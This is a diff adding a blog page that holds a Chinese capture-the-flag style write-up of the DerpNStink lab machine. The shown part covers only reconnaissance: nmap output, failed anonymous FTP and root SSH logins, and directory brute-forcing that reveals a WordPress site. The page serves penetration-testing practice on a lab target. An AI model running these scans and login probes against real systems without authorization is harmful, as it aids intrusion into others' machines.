@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="EnchanterW">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/04/11/derpnstink/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="So many things to hack , such little time to work.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Derpnstink靶机">
+<meta property="og:url" content="http://example.com/2025/04/11/DeRPnStiNK/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="So many things to hack , such little time to work.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-04-11T09:11:52.000Z">
+<meta property="article:modified_time" content="2025-05-27T13:27:11.880Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Linux提权">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="WordPress">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="Metasploit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-DQKJ6ECS1S"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-DQKJ6ECS1S');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+    <meta name="theme-color" content="#3C9566">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Derpnstink靶机 | Enchanterの小本本
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3C9566","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"So many things to hack , such little time to work."},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"So many things to hack , such little time to work."},"google_analytics":{"enable":true,"id":"G-DQKJ6ECS1S"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Wellcome to my blog","subtitle":{"text":["So many things to hack , such little time to work."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#053154"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/Enchanter-W","Blog":"https://enchanter-w.github.io/","Friends":"/friends"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/12/30 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">
+
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        So many things to hack , such little time to work.
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/web-app-manifest-192x192.png" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Enchanterの小本本
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/Enchanter-W">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://enchanter-w.github.io/">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/Enchanter-W">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://enchanter-w.github.io/">BLOG</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags/"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories/"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">26</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/images/DerpNStink_cover.jpg" alt="Derpnstink靶机" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Derpnstink靶机</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/web-app-manifest-192x192.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">EnchanterW</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-04-11 17:11:52</span>
+        <span class="mobile">2025-04-11 17:11:52</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-27 21:27:11</span>
+            <span class="mobile">2025-05-27 21:27:11</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Writeup/">Writeup</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Linux%E6%8F%90%E6%9D%83/">Linux提权</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WordPress/">WordPress</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Metasploit/">Metasploit</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="靶机发现"><a href="#靶机发现" class="headerlink" title="靶机发现"></a>靶机发现</h2><h3 id="Nmap-扫描结果"><a href="#Nmap-扫描结果" class="headerlink" title="Nmap 扫描结果"></a>Nmap 扫描结果</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Thu Apr 10 21:08:23 2025 as: nmap -sT -p21,22,80 -sC -sV -O -oA ./nmapscan/detials 192.168.55.129</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.55.129</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)</span><br><span class="line">|   2048 72:c5:1c:5f:81:7b:<span class="built_in">dd</span>:1a:fb:2e:59:67:fe:a6:91:2f (RSA)</span><br><span class="line">|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)</span><br><span class="line">|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-title: DeRPnStiNK</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/php/ /temporary/</span><br><span class="line">MAC Address: 00:0C:29:4A:30:F8 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu Apr 10 21:08:33 2025 -- 1 IP address (1 host up) scanned in 9.80 seconds</span></span><br><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Thu Apr 10 21:06:52 2025 as: nmap -sT -p- -oA ./nmapscan/ports 192.168.55.129</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.55.129</span><br><span class="line">Host is up (0.0038s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:4A:30:F8 (VMware)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Thu Apr 10 21:07:03 2025 -- 1 IP address (1 host up) scanned in 11.22 seconds</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="端口探测-服务探测"><a href="#端口探测-服务探测" class="headerlink" title="端口探测&amp;服务探测"></a>端口探测&amp;服务探测</h2><h3 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]</span><br><span class="line">└─$ ftp 192.168.55.129     </span><br><span class="line">Connected to 192.168.55.129.</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">Name (192.168.55.129:kali): anonymous</span><br><span class="line">530 Permission denied.</span><br><span class="line">ftp: Login failed</span><br><span class="line">ftp&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>不允许匿名登录</p>
+<h3 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]</span><br><span class="line">└─$ ssh root@192.168.55.129   </span><br><span class="line">Ubuntu 14.04.5 LTS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                       ,~~~~~~~~~~~~~..</span><br><span class="line">                       <span class="string">&#x27;  Derrrrrp  N  `</span></span><br><span class="line"><span class="string">        ,~~~~~~,       |    Stink      | </span></span><br><span class="line"><span class="string">       / ,      \      &#x27;</span>,  ________ _,<span class="string">&quot;</span></span><br><span class="line"><span class="string">      /,~|_______\.      \/</span></span><br><span class="line"><span class="string">     /~ (__________)   </span></span><br><span class="line"><span class="string">    (*)  ; (^)(^)&#x27;:</span></span><br><span class="line"><span class="string">        =;  ____  ;</span></span><br><span class="line"><span class="string">          ; &quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;  ;=</span></span><br><span class="line"><span class="string">   &#123;&quot;</span>&#125;_   <span class="string">&#x27; &#x27;</span><span class="string">&quot;&quot;</span><span class="string">&#x27; &#x27;</span> _&#123;<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">   \__/     &gt;  &lt;   \__/</span></span><br><span class="line"><span class="string">      \    ,&quot;</span>   <span class="string">&quot;,  /</span></span><br><span class="line"><span class="string">       \  &quot;</span>       /<span class="string">&quot;</span></span><br><span class="line"><span class="string">          &quot;</span>      <span class="string">&quot;=</span></span><br><span class="line"><span class="string">           &gt;     &lt;</span></span><br><span class="line"><span class="string">          =&quot;</span>     <span class="string">&quot;-</span></span><br><span class="line"><span class="string">          -`.   ,&#x27;</span></span><br><span class="line"><span class="string">                -</span></span><br><span class="line"><span class="string">            `--&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@192.168.55.129: Permission denied (publickey).</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>需要公钥登录</p>
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><ul>
+<li>默认 Apache 界面</li>
+<li>使用 Gobuster 和 Dirsearch 爆破目录</li>
+<li>发现 <code>/weblog</code> 目录为 WordPress</li>
+</ul>
+<h2 id="web服务探测"><a href="#web服务探测" class="headerlink" title="web服务探测"></a>web服务探测</h2><p>打开是一个apache默认界面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411130631763.png"
+                     
+                ></p>
+<p>直接先用gobuster和dirsearch开始爆破一波目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411132637498.png"
+                      alt="image-20250411132637498"
+                ></p>
